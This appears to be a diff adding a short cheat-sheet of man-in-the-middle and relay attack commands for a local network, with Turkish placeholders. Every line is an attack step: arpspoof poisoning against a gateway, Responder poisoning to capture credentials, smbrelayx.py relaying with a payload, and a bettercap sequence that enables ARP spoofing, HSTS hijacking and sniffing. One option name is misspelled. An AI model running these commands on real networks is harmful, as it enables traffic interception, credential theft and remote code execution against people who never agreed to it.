@@ -1,0 +1,12 @@
+arpspoof -i eth0 -t <gateway> <ip adresi>
+responder -I eth0 -w -r -f 
+smbrelayx.py -h <ip adresi> -e <payload>
+
+bettercap
+net.recon on
+net.probe on
+set arp.spoof.targets ipadresi
+set arp.spoof.fulldublex true
+set arp.spoof.internal true
+hstshijack/hstshijack 
+net.sniff on
